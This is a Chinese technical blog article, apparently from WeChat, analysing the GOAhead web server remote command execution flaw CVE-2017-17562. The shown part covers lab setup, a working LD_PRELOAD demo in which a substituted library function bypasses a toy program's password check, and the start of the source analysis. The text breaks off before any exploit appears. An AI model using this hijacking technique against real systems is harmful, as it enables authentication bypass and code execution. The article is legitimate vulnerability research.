---
title: GOAhead CVE-2017-17562深入分析
author: uestcdzy
wechat_source: >-
  http://mp.weixin.qq.com/s?timestamp=1515984875&src=3&ver=1&signature=yyLj*6br2FUtW3BtBE3siPPs-NRfvlwjuvH7xFTtLmsOPyUEuRfepE4lmADgDB-KqTGJpoTQDDroKcwkYhW3KXB7fIO6oJiCAMnNHLfKjGyBZsEY4HWhc1u0s-*ie*MBD-9Whzztv-r4qxkToYKkB829H9h1gJQCdSYIq8CttW0=
date: '2018-01-11 00:00:00 +0000'

---

{% raw  %}
<p><br></p><h3 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">1. 前提准备</span></strong></span></h3><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">GOAhead是一个嵌入式的webserver，前几周被爆出一个远程命令执行的漏洞，受漏洞影响版本：2.5-3.6.4。本文进行该漏洞的深入分析，漏洞调试环境：Ubuntu
 16.04 
64bit，GOAhead版本3.6.4，下载地址：<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">https://github.com/embedthis/goahead/releases。</span></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><h4 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;">1.1 GOAhead软件下载和配置</span></strong></span></h4><p><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">GOAhead安装和cgi扩展启用参考：<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">http://blog.csdn.net/yangguihao/article/details/49820765</span>。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">GOAhead要启用CGI时，记的是修改要修改/etc/goahead中的route.txt。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsa387hz8g8rDqtLFJt7Qu3pMgKibTpOox0JibuJaYhh7sSa06ibL13CuibQ/0?wx_fmt=jpeg" style="cursor: pointer; width: 730px !important; height: 244px !important; visibility: visible !important;"><br><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"> &nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">dir是cgi的存放目录，其目录下存放一个cgi_test,里面内容随便写,然后gcc编译即可。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLskbVwjA98eHkOmIicpDlOfGGm7s4AaJAe8YnqpcpBxlDXgAKZN6dPX9w/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 87.2768px !important;"></p><p style="margin-left: 8px;margin-right: 8px;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLs1KvSZ3FxDpIktDvqJ6qicge804uHzPrLianSohzlF2IeppOSHTIKicBSA/0?wx_fmt=jpeg" style="cursor: pointer; width: 274px !important; height: 134px !important;"></p><p style="margin-left: 8px;margin-right: 8px;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">输入cgi的url：<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">http://172.20.94.98:8888/cgi-bin/cgi_test</span></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><span style="color: rgb(0, 81, 171);letter-spacing: 2px;"><br></span></strong></span></p><h4 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 16px;"><strong><span style="font-size: 16px;letter-spacing: 2px;">1.2 LD_PRELOAD执行环境变量分析</span></strong></span></h4><p><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载执行，动态库加载的优先级最高，一般情况下，其加载顺序为：<span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">LD_PRELOAD&gt;LD_LIBRARY&gt;/etc/ld.so.cache
 
&gt;/lib&gt;/usr/lib.</span></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;"></span>它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态库，甚至覆盖正常的函数库。</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">LA_PRELOAD</span><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">替换前：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLs6WGrNM2u8gqQjVdPRtSfqDXGwsNaWH8PFWq13vvM9tqUqyPnZJEKNg/0?wx_fmt=jpeg" style="cursor: pointer; width: 543px !important; height: 248px !important;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">&nbsp;<br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">LA_PRELOAD</span><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">替换后：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLs4icZicda1hJX7PtOpVHa4Yc2e7WJqzER0iaxiaGazCd1CwwibQLzOWc1wWg/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 233.272px !important;"></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">演示程序：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">ａ.主程序(login.c)</span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include &lt;stdio.h&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include &lt;string.h&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include "myverify.h"</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">void main(int argc, char const *argv[])</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">{</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char &nbsp; pwd[] = "123456";</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(argc &nbsp; &lt; 2)</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("usage: &nbsp; %s &lt;your password&gt;\n", argv[0]);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(!verify(pwd, &nbsp; argv[1]))</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("login &nbsp; success\n");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("login &nbsp; fail\n");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">}</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">b.调用库(myverify.h和myverify.c)</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include &lt;stdio.h&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">int verify(const char *s1, const char *s2);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include &lt;stdio.h&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include &lt;string.h&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include "myverify.h"</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">int verify(const char *s1, const char &nbsp; *s2)</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">{</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return &nbsp; strcmp(s1, s2);</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">}</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">c.编译运行效果如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLsyU1Q4aVAp5cxs8F9IxxWSlRU8sIWT8yZEUQDLZaPe5BdQg8oQR2ONw/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 189.081px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">相关命令解释如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">gcc myverify.c -fPIC -shared -o libmyverify.so #编译动态链接库</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">gcc login.c -L. -lmyverify -o mylogin #编译主程序</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">export LD_LIBRARY_PATH=/home/daizy/workplace/CDemo/LinuxAPI/ #指定动态链接库所在目录位置</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: normal;">ldd myverifypasswd #显示、确认依赖关系</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">d.替换代码如下：(myhack.c)</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include &lt;stdio.h&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">#include &lt;string.h&gt;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">int verify(const char *s1, const char &nbsp; *s2)</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">{</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("hack &nbsp; function invoked.\n");</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return &nbsp; 0;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">}</span></p></blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">e.编译设置环境变量LD_PRELOAD,运行替换代码效果如下：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><img src="http://mmbiz.qpic.cn/mmbiz_jpg/1UG7KPNHN8GgAMG2cdZvAe9SYk7q1wLs5icqicSnhZB79nsRicBNolibLgvd6ezpjgwaR00n3icNY85tkU8U455xWvA/0?wx_fmt=jpeg" style="cursor: pointer; width: 754px !important; height: 115.632px !important;"><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">export LD_PRELOAD="./myhack.so" #设置LD_PRELOAD环境变</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">量,库中的同名函数在程序运行时优先调用</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;"><br></span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">ps:替换结束，要还原函数调用关系，用命令unset LD_PRELOAD&nbsp;解除</span></p><h3 style="margin-left: 8px;margin-right: 8px;"><br></h3><p><br></p><h3 style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(0, 81, 171);font-size: 18px;"><strong><span style="font-size: 18px;letter-spacing: 2px;">2.CVE分析</span></strong></span></h3><p><br></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">以GOAhead 3.6.4版本为例进行漏洞分析：</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="font-size: 15px;color: rgb(79, 79, 79);letter-spacing: 2px;">当用户post提交数据时，goahead最终会调用http.c中readEvent(Webs *wp)进行数据读取的处理，其中结构体Webs后续会常看到，此处先给出该结构体大致定义，在goahead.h中可以查找到：</span></p><blockquote><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">typedef struct &nbsp; Webs {</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; WebsBuf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rxbuf;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Raw receive buffer */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; WebsBuf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; input;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Receive buffer after &nbsp; de-chunking */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; WebsBuf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; output;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Transmit buffer after &nbsp; chunking */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; WebsBuf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; chunkbuf;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Pre-chunking data buffer &nbsp; */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; WebsBuf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *txbuf;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp; &nbsp;WebsHash&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vars;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; CGI standard variables &nbsp; */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rxChunkState;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Rx chunk encoding state */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; ssize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rxChunkSize;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Rx chunk size */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *rxEndp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Pointer to end of raw &nbsp; data in input beyond endp */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; ssize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lastRead;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Number of bytes last read &nbsp; from the socket */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; ssize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; txChunkPrefixLen;&nbsp;&nbsp; /**&lt; Length of prefix */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; ssize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; txChunkLen;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Length of the chunk */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; txChunkState;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Transmit chunk state */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *filename;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Document path name */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *path;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Path name without query. &nbsp; This is decoded. */&nbsp;</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sid;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Socket id (handler) &nbsp; */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; routeCount;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Route count limiter */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; ssize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rxLen;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Rx content length */</span></p><p style="margin-left: 8px;margin-right: 8px;"><span style="color: rgb(79, 79, 79);letter-spacing: normal;font-size: 12px;">&nbsp;&nbsp;&nbsp; ssize&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rxRemaining;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**&lt; Remaining content to read &nbsp; from client */</span></p><p 